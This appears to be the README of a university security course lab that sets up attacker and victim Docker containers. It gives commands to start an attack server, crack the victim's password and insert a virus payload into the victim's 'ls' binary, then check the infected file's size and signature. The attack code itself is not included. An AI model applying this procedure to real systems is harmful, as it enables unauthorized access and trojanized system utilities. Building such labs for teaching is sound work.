# csc2024-project3

## Install 

### Building the Docker Containers

- To set up the pasword for both the attacker and the victim, modify the 'PASSWORD' param in the csc2024-project3-docker-compose.yml file. 

- To build and run the docker containers, run the following command :
    ```
    docker compose -f csc2024-project3-docker-compose.yml up -d 
    ```

## How to run 

#### Attacker:
- Set up the attack server by running the following command: 
    ```
    ./attacker_server <attacker_port>
    ```
- Then crack the password of the victim, and inserting the virus payload into the victim's ls by using the following command: 
    ```
    ./crack_attack <victim_ip> <attacker_ip> <attacker_port>
    ```

#### Victim:

- To acitvate the virus, simply execute the 'ls' in the '/app' directory.

####

## Verification 
To verify the validity of the attack, check : 
- The size of the fake 'ls' in the /app directory with the original 'ls', using :

    ```
    wc -c /app/ls
    wc -c /usr/bin/ls
    ```
- If the signature of the fake 'ls' equals to /xaa/xbb/xcc/xdd : 
    ```
    xxd /app/ls | tail -n 1
    ```


